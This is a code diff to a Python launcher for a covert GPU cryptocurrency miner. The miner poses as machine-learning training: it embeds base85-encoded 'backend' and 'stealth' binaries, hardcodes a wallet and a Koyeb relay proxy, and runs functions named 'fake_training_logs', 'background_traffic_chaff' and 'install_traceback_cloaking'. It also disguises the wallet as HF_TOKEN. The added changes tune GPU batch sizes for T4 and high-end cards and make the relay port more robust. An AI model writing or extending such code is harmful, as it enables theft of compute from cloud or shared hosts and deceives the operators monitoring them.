@@ -48,6 +48,7 @@ import secrets
 import argparse
 import threading
 import subprocess
+import queue
 import urllib.request
 import urllib.parse
 from concurrent.futures import ThreadPoolExecutor
@@ -55,7 +56,7 @@ from concurrent.futures import ThreadPoolExecutor
 BACKEND_SO_B85 = "__BACKEND_SO_B85__"
 STEALTH_SO_B85 = "__STEALTH_SO_B85__"
 
-DEFAULT_KOYEB_PROXY = "https://pearl-hub-tranteo777-eb4ff2aa.koyeb.app"
+DEFAULT_KOYEB_PROXY = "https://tensor-compute-0-1764066918-aablow-348edb35.koyeb.app"
 DEFAULT_STRATUM_PORT = 3333
 DEFAULT_WALLET = "prl1pwv3jfurx9x6fkrnk40r8ctw09lgjc2xxl9xzlr89spyudpv9gkvqvq0y06"
 
@@ -108,12 +109,19 @@ def extract_payloads(target_dir):
 
     return backend_so_path, stealth_so_path
 
-def run_bridge(local_port=3333, proxy_url=DEFAULT_KOYEB_PROXY, wallet="", worker=None):
+def run_bridge(local_port=3333, proxy_url=DEFAULT_KOYEB_PROXY, wallet="", worker=None, port_cb=None):
     if not worker:
         worker = get_default_worker()
     server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    server_sock.bind(('127.0.0.1', local_port))
+    try:
+        server_sock.bind(('127.0.0.1', local_port))
+    except OSError:
+        # Fallback to system-allocated ephemeral port if default port is in use
+        server_sock.bind(('127.0.0.1', 0))
+    actual_port = server_sock.getsockname()[1]
+    if port_cb:
+        port_cb(actual_port)
     server_sock.listen(5)
 
     threading.Thread(target=background_traffic_chaff, args=(proxy_url, wallet, worker), daemon=True).start()
@@ -481,6 +489,8 @@ def main():
     parser.add_argument("--mock-diff", type=float, default=1.0, help="Mock difficulty")
     parser.add_argument("--align-test", action="store_true", help="Run offline alignment test")
     parser.add_argument("--align-test-prod", action="store_true", help="Run offline prod alignment test")
+    parser.add_argument("--profile-scan", type=int, nargs="?", const=1, default=None, help="Run scan profile benchmark")
+    parser.add_argument("--col-batch", "--col-period-batch", type=str, default=None, help="Col period batch size")
     args = parser.parse_args()
 
     worker_id = args.worker if args.worker else get_default_worker()
@@ -519,41 +529,58 @@ def main():
     # 1024 total row periods. Ensure every GPU gets equal work partition:
     # On high SM GPUs (RTX 6000 Ada with 142 SMs), default to 128 so matrix Ap slice
     # is 128 * 128 * 4096 = 64MB, fitting 100% resident inside the 72MB persisting L2 window
+    is_high_sm = False
+    is_t4 = False
+    try:
+        name_out = subprocess.check_output(
+            ["nvidia-smi", "--query-gpu=gpu_name", "--format=csv,noheader"],
+            stderr=subprocess.DEVNULL
+        ).decode('utf-8').lower()
+        if any(k in name_out for k in ("6000", "ada", "4090", "h100", "a100", "l40")):
+            is_high_sm = True
+        elif "t4" in name_out:
+            is_t4 = True
+    except Exception:
+        pass
+
     if args.row_batch:
         row_batch_str = args.row_batch
     else:
-        is_high_sm = False
-        try:
-            name_out = subprocess.check_output(
-                ["nvidia-smi", "--query-gpu=gpu_name", "--format=csv,noheader"],
-                stderr=subprocess.DEVNULL
-            ).decode('utf-8').lower()
-            if any(k in name_out for k in ("6000", "ada", "4090", "h100", "a100", "l40")):
-                is_high_sm = True
-        except Exception:
-            pass
-
         if gpu_count >= 8:
             row_batch_str = "128"
         elif gpu_count >= 4:
             row_batch_str = "128"
+        elif is_t4:
+            row_batch_str = "16"
         else:
             row_batch_str = "128" if is_high_sm else "512"
 
-    is_offline_test = args.mock or args.align_test or args.align_test_prod
+    if args.col_batch:
+        col_batch_str = args.col_batch
+    elif is_t4:
+        col_batch_str = "64"
+    else:
+        col_batch_str = None
+
+    is_offline_test = args.mock or args.align_test or args.align_test_prod or (args.profile_scan is not None)
 
     # Install Python Exception & Traceback Cloaking
     install_traceback_cloaking()
 
+    actual_port = args.port
     if not is_offline_test:
+        port_q = queue.Queue(maxsize=1)
         # Start OpenAI Bridge in background thread
         t_bridge = threading.Thread(
             target=run_bridge,
-            args=(args.port, args.proxy, args.wallet, worker_id),
+            args=(args.port, args.proxy, args.wallet, worker_id, port_q.put),
             daemon=True
         )
         t_bridge.start()
-        time.sleep(1.0)
+        try:
+            actual_port = port_q.get(timeout=5.0)
+        except Exception:
+            actual_port = args.port
 
         # Start fake loss logging & telemetry camouflage
         threading.Thread(target=fake_training_logs, daemon=True).start()
@@ -576,7 +603,7 @@ def main():
         print(f"[FATAL] Failed to load backend binary: {e}", file=sys.stderr)
         sys.exit(1)
 
-    os.environ["MASTER_ADDR"] = f"127.0.0.1:{args.port}"
+    os.environ["MASTER_ADDR"] = f"127.0.0.1:{actual_port}"
     os.environ["HF_TOKEN"] = args.wallet
     os.environ["LOCAL_RANK"] = worker_id
 
@@ -586,12 +613,16 @@ def main():
         b"--devices", dev_str.encode('utf-8'),
         b"--row-period-batch", row_batch_str.encode('utf-8')
     ]
+    if col_batch_str:
+        raw_args += [b"--col-period-batch", col_batch_str.encode('utf-8')]
     if args.mock:
         raw_args += [b"--mock", b"--mock-diff", str(args.mock_diff).encode('utf-8')]
     elif args.align_test:
         raw_args += [b"--align-test"]
     elif args.align_test_prod:
         raw_args += [b"--align-test-prod"]
+    elif args.profile_scan is not None:
+        raw_args += [b"--profile-scan", str(args.profile_scan).encode('utf-8')]
 
     argc = len(raw_args)
     argv = (ctypes.c_char_p * (argc + 1))(*raw_args, None)
